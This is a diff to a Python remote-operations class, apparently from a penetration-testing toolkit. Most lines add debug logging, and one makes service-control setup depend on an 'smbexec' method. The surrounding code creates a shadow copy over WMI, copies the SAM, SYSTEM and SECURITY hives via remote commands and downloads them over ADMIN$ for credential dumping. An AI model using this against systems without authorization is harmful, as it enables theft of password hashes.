@@ -777,6 +777,10 @@ class RemoteOperations:
                 LOG.error(e)
             return None
 
+    def __getSCManagerHandle(self):
+        ans = scmr.hROpenSCManagerW(self.__scmr)
+        self.__scManagerHandle = ans['lpScHandle']
+
     def __checkServiceStatus(self):
         # Open SC Manager
         ans = scmr.hROpenSCManagerW(self.__scmr)
@@ -1063,9 +1067,11 @@ class RemoteOperations:
         iWbemLevel1Login.RemRelease()
 
         win32ShadowCopy,_ = iWbemServices.GetObject('Win32_ShadowCopy')
+        LOG.debug('Trying to create SS remotely via WMI')
         result = win32ShadowCopy.Create(volume, 'ClientAccessible')
 
         shadowId = result.ShadowID
+        LOG.debug('Got ShadowID %s' % shadowId)
 
         dcom.disconnect()
 
@@ -1081,11 +1087,12 @@ class RemoteOperations:
         iWbemServices= iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
         iWbemLevel1Login.RemRelease()
 
+        LOG.debug('Getting original volume and SS volume via WMI')
         result = iWbemServices.ExecQuery(query)
         obj = result.Next(0xffffffff, 1)[0]
 
         dcom.disconnect()
-
+        LOG.debug('Got %s %s' % (obj.DeviceObject,obj.VolumeName))
         return (obj.DeviceObject,obj.VolumeName)
 
     def __WMIcopy(self, sourcePath, destinationPath):
@@ -1115,6 +1122,7 @@ class RemoteOperations:
         iWbemLevel1Login.RemRelease()
 
         result = iWbemServices.ExecQuery(query)
+        LOG.debug('Getting drive letter via WMI using VolumeName')
 
         i = 1
         driveObject = result.Next(0xffffffff, i)
@@ -1279,13 +1287,17 @@ class RemoteOperations:
         randomNameSAM = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(6))
         randomNameSYSTEM = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(6))
         randomNameSECURITY = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(6))
+        LOG.debug('Performed SS and got info via WMI')
 
         #self.__WMIcopy('%s\\System32\\Config\\SAM' % ssVolume, '%s\\%s' % (pathToCopy,randomNameSAM))
         #self.__WMIcopy('%s\\System32\\Config\\SYSTEM' % ssVolume, '%s\\%s' % (pathToCopy,randomNameSYSTEM))
         #self.__WMIcopy('%s\\System32\\Config\\SECURITY' % ssVolume, '%s\\%s' % (pathToCopy,randomNameSECURITY))
 
-        self.__connectSvcCtl()
-        self.__checkServiceStatus()
+        if self.__execMethod == 'smbexec':
+            self.__connectSvcCtl()
+            self.__getSCManagerHandle()
+
+        LOG.debug('Trying to copy the files to Temp directory')
         self.__executeRemote('%%COMSPEC%% /C copy %s\\Windows\\System32\\Config\\SAM %s\\%s' % (ssVolume, pathToCopy, randomNameSAM))
         time.sleep(5)
         self.__executeRemote('%%COMSPEC%% /C copy %s\\Windows\\System32\\Config\\SYSTEM %s\\%s' % (ssVolume, pathToCopy, randomNameSYSTEM))
@@ -1300,6 +1312,7 @@ class RemoteOperations:
                 self.__smbConnection.getFile('ADMIN$', p[1], local_file.write)
 
         # Return a list of the local paths where SAM, SYSTEM and SECURITY were downloaded
+        LOG.debug('Downloaded from disk SAM, SYSTEM and SECURITY. Dumping...')
         return list(zip(*paths))[0]
 
 class CryptoCommon:
